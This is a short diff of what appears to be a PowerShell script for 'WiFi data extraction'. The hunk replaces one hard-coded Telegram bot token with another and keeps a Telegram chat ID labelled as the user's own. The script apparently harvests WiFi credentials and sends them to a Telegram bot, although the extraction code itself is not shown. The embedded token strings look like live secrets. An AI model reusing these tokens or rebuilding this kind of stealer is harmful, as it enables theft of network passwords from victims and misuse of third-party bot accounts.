@@ -2,7 +2,7 @@
 # Fixed file path handling and improved WiFi data extraction
 
 param(
-    [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$TelegramBotToken = "987654321:AAFJIVTAWodBwzGX2CLne6-PK4RFNSy-8OY",
     [string]$TelegramChatID = "2047893044"  # Your Chat ID
 )
 
